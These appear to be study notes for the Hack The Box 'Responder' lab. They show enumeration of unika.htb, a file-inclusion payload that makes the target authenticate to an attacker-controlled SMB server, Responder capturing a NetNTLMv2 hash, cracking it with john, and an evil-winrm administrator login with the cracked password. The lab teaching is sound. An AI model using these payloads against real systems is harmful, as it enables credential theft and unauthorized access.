# Responder

## Introduction 

windows is most predominant OS   
most orgs use active directory to set up their windows domain networks   
NTLM and kerberos for authentication services   

## Enumeration 

![](../Images/Pasted%20image%2020240527161621.png)

we can see from nmap that there is an HTTP apache server up and a WinRM server  

windows remote management (WinRM) is a windows remote management protocol that uses simple object access protocol to interact with remote computers and servers    
lets user: 
- remotely communicate and interface with hosts 
- execute commands remotely on systems that are not local to you but are network accessible 
- monitor, manage and configure servers, os and clients machines from a remote location 

if we visit our IP's webpage the browser will return a message about being unable to find the site: 

![](../Images/Pasted%20image%2020240527162015.png)

however, notice that the url is now `unika.htb`   
the browser has redirected you to `unika.htb` but doesn't know how to find it   
the webserver is using name-based vhosting for serving requests 

we can add this as an entry to our `/etc/hosts` file: 

![](../Images/Pasted%20image%2020240527162248.png)

so that now we can visit the website and be able to see it: 

![](../Images/Pasted%20image%2020240527162314.png)

on the site we can see that it uses a url parameter to change the language and site content 

we can use this to input basic LFI payloads to read the windows hosts file: 

![](../Images/Pasted%20image%2020240527165508.png)

## Responder Challenge Capture

if we use a protocol like SMB, windows will try to authenticate to our machine and we can capture the NetNTLMv2  

NTML is a challenge-response authentication protocol used to authenticate a client to a resource on an active directory domain   
type of SSO because it allows the user to provide the underlying authentication factor only once   

NTLM process: 
- client sends username and domain name to server
- server generates random character string which is the challenge
- client encrypts the challenge with the NTLM hash of the user password and sends it back to server
- server retrieves the user password 
- server uses hash value from security account database to encrypt the challenge string, value is then compared to the value received from the client 

## Using Responder 

in php often `allow_url_include` is set to off by default but even if it is then it will not prevent the loading of SMB URLs, which we can use to steal the NTLM hash   

responder will set up a malicious SMB server   
target machine attempts to perform the NTLM auth to that server  
responder sends a challenge back to encrypt with the user's password   
when server responds, responder will use the challenge and encrypted response to generate netNTMLv2  
we can't reverse the resulting netntlmv2 but we can try common passwords to see if we can generate the same one   

we can start up our responder: 

![](../Images/Pasted%20image%2020240527173342.png)

then use the LFI vulnerable parameter to send a request to our responder server: 

```
http://unika.htb/index.php?page=//<our IP>/somefile
```

we will then get a response on our server: 

![](../Images/Pasted%20image%2020240527173456.png)

we can export the hash into a text file: 

![](../Images/Pasted%20image%2020240527173552.png)

using `john -w=<wordlist> hash.txt` we can successfully crack the password hash: 

![](../Images/Pasted%20image%2020240527173759.png)

since linux doesn't have powershell we can use `Evil-winrm` to login: 

```shell
evil-winrm -i <ip> -u administrator -p badminton
```


